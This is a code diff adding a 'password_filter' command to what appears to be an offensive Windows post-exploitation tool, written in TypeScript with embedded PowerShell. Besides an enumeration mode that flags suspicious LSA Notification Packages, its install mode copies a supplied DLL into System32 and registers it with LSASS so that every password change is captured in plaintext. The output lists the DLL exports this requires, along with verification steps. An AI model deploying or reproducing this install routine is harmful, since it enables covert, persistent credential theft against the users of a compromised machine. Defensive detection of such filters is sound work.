@@ -23070,6 +23070,181 @@ Write-Output "[+] SSP removed (reboot may be needed to fully unload from LSASS)"
   return { output: output.join("\n"), findings }
 }
 
+async function passwordFilter(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const dll = argVal(args, "--dll")
+  const filterName = argVal(args, "--name") || "CyberStrikePF"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Password filter DLL operations...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Password Filter / Notification Packages ==="
+Write-Output ""
+
+# Notification Packages (password filters)
+$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$notifPkgs = (Get-ItemProperty $lsaKey -Name 'Notification Packages' -ErrorAction SilentlyContinue).'Notification Packages'
+
+Write-Output "Registered Notification Packages:"
+$pkgCount = 0
+$suspicious = 0
+$knownPkgs = @('scecli', 'rassfm')
+
+foreach ($pkg in $notifPkgs) {
+  $trimmed = $pkg.Trim()
+  if ($trimmed) {
+    $pkgCount++
+    $dllPath = "$env:SystemRoot\\System32\\$trimmed.dll"
+    $exists = Test-Path $dllPath
+    $sig = if ($exists) { (Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue).Status } else { 'N/A' }
+    $isKnown = $trimmed.ToLower() -in $knownPkgs
+    $marker = if (-not $isKnown) { ' [!] NON-STANDARD' } else { '' }
+
+    Write-Output "  $trimmed — $(if ($exists) { if ($sig -eq 'Valid') { 'Signed' } else { 'UNSIGNED [!]' } } else { 'DLL NOT FOUND [!]' })$marker"
+    if (-not $isKnown) { $suspicious++ }
+  }
+}
+Write-Output ""
+Write-Output "PKG_COUNT=$pkgCount"
+Write-Output "SUSPICIOUS=$suspicious"
+
+# Password policy info
+Write-Output ""
+Write-Output "=== Password Policy ==="
+$policy = net accounts 2>&1
+Write-Output $policy
+
+# Check if password filters can be loaded (LSASS not PPL)
+Write-Output ""
+$ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
+Write-Output "LSASS PPL: $(if ($ppl -eq 1) { 'ENABLED — custom filter DLL may be blocked' } else { 'DISABLED — filters load normally' })"
+Write-Output "PPL=$ppl"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const suspicious = r.stdout.match(/SUSPICIOUS=(\d+)/)
+    if (suspicious && parseInt(suspicious[1]) > 0) {
+      findings.push({
+        checkId: "WIN-PF-001",
+        provider: "windows",
+        severity: "critical",
+        status: "SUSPICIOUS",
+        resource: "lsa://notification-packages",
+        title: `${suspicious[1]} non-standard password filter(s) found`,
+        details: "Non-standard Notification Packages in LSASS may be capturing plaintext passwords on every password change.",
+        remediation: "Review HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Notification Packages and remove unknown entries.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!dll) {
+      output.push("ERROR: --dll required (path to password filter DLL)")
+      output.push("")
+      output.push("The password filter DLL must export:")
+      output.push("  - InitializeChangeNotify() → BOOL")
+      output.push("  - PasswordChangeNotify(UserName, RelativeId, NewPassword) → NTSTATUS")
+      output.push("  - PasswordFilter(AccountName, FullName, Password, SetOperation) → BOOL")
+      output.push("")
+      output.push("PasswordChangeNotify receives the plaintext password on every change.")
+      output.push("Return TRUE from PasswordFilter to allow the change (FALSE rejects it).")
+      output.push("")
+      output.push("Requires reboot to take effect (LSASS loads filters at startup).")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== Installing Password Filter ==="
+Write-Output "DLL: ${dll}"
+Write-Output "Name: ${filterName}"
+Write-Output ""
+
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+  Write-Output "[-] Administrator privileges required"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+# Copy DLL to System32
+$dllFile = [System.IO.Path]::GetFileName('${dll}')
+$dllName = [System.IO.Path]::GetFileNameWithoutExtension('${dll}')
+$destPath = "$env:SystemRoot\\System32\\$dllFile"
+Copy-Item '${dll}' $destPath -Force
+Write-Output "[+] DLL copied to: $destPath"
+
+# Add to Notification Packages
+$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$current = (Get-ItemProperty $lsaKey -Name 'Notification Packages').'Notification Packages'
+if ($dllName -notin $current) {
+  $updated = $current + $dllName
+  Set-ItemProperty $lsaKey -Name 'Notification Packages' -Value $updated
+  Write-Output "[+] Added '$dllName' to Notification Packages"
+  Write-Output ""
+  Write-Output "[!] REBOOT REQUIRED for password filter to load"
+  Write-Output "[*] After reboot, every password change will be captured"
+  Write-Output ""
+  Write-Output "[*] Verification after reboot:"
+  Write-Output "    - Check Event Log: System > Source: Scecli"
+  Write-Output "    - Trigger: net user testuser NewP@ss123 /domain"
+  Write-Output "    - Check output location (DLL-dependent)"
+  Write-Output ""
+  Write-Output "Cleanup: winhook password_filter --action remove --name $dllName"
+  Write-Output "STATUS=SUCCESS"
+} else {
+  Write-Output "[*] '$dllName' already registered"
+  Write-Output "STATUS=EXISTS"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-PF-010",
+        provider: "windows",
+        severity: "critical",
+        status: "INSTALLED",
+        resource: `lsa://password-filter/${filterName}`,
+        title: `Password filter installed: ${filterName}`,
+        details: "Password filter DLL will load into LSASS on next boot. All password changes will be captured in plaintext.",
+        remediation: `Remove: winhook password_filter --action remove --name ${filterName}`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    const targetName = argVal(args, "--name") || filterName
+    const script = `
+Write-Output "=== Removing Password Filter ==="
+
+$lsaKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'
+$current = (Get-ItemProperty $lsaKey -Name 'Notification Packages').'Notification Packages'
+$filtered = $current | Where-Object { $_.Trim() -ne '${targetName}' }
+
+if ($filtered.Count -lt $current.Count) {
+  Set-ItemProperty $lsaKey -Name 'Notification Packages' -Value $filtered
+  Write-Output "[+] Removed '${targetName}' from Notification Packages"
+} else {
+  Write-Output "[*] '${targetName}' not found"
+}
+
+$dllPath = "$env:SystemRoot\\System32\\${targetName}.dll"
+if (Test-Path $dllPath) {
+  Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+  Write-Output "[+] DLL removed: $dllPath"
+}
+Write-Output "[+] Filter removed (reboot needed to unload from LSASS)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -26708,6 +26883,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   print_monitor_persist: printMonitorPersist,
   clm_bypass: clmBypass,
   ssp_persist: sspPersist,
+  password_filter: passwordFilter,
 }
 
 export const WinhookTool = Tool.define("winhook", {
